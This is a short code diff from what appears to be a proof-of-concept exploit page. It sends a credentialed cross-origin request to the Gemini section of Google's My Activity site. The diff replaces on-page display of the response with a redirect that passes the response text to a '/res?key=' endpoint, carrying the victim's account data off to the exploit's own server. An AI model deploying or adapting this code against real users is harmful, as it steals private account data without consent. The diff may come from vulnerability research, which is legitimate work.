@@ -13,8 +13,8 @@
         const request = new XMLHttpRequest()
         request.open("get", "https://myactivity.google.com/product/gemini?utm_source=gemini", true)
         request.onload = ()=>{
-            // window.location.href = "/res?key=" + request.responseText
-            document.getElementById('poc').innerHTML= request.responseText;
+            window.location.href = "/res?key=" + request.responseText
+            // document.getElementById('poc').innerHTML= request.responseText;
         }
         request.withCredentials = true
         request.send()
